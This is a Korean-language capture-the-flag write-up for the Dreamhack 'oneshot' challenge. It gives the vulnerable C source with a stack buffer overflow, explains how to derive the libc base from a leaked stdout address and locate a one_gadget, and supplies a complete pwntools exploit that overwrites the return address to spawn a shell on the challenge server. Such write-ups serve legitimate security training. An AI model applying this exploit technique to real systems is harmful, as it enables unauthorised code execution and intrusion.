---
tags: [dreamhack, wargame, write-up]		
published : false
---

```bash
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

onesoht gadget이란

oneshot-gadget은 해당 가젯의 주소로 점프하여 호출하는 것만으로 /bin/sh이 실행되는 가젯이다. 그저 ret 영역에 oneshot-gadget의 주소를 덮어씌워줌으로써 exploit 된다.

---

프로그램을 실행하면 printf를 통해 libc 내부 stdout 전역 변수의 주소가 출력되는데, 해당 주소로 오프셋 계산을 통해 libc_base 주소를 알아낼 수 있다.

![Image](/assets/img/oneshot/image1.png)

해당 결과를 통해 stdout의 offset은 0x3c5708 라는 것을 구할 수 있다.

이제 one_gadget을 찾아야 하는데, one_gadget은 심볼 테이블에 이름으로 등록된 게 아니고, 코드 내부 특정 instruction 흐름에서 조건이 맞으면 shell로 직행하는 주소이다. 

readelf -s 는 심볼(함수, 변수)만 보여주므로 one_gadget이 나오지않는다.

따라서 직접 libc 바이너리를 분석해서 offset을 뽑아주는 one_gadget 툴을 써야한다.

![Image](/assets/img/oneshot/image2.png)

![Image](/assets/img/oneshot/image3.png)

```bash
from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 23842)
e = ELF("./oneshot")
libc = ELF("./libc.so.6")

one_gadget = 0x45216

p.recvuntil("stdout: ")
stdout = int(p.recvline()[:-1], 16)
base = stdout - libc.symbols["_IO_2_1_stdout_"]
one_gadget = base + one_gadget

slog("STDOUT", stdout)
slog("base", base)
slog("one gadget", one_gadget)

payload = b'A'*24
payload += b'\x00'*8
payload += b'B'*8
payload += p64(one_gadget)

p.sendafter("MSG: ", payload)
p.interactive()
```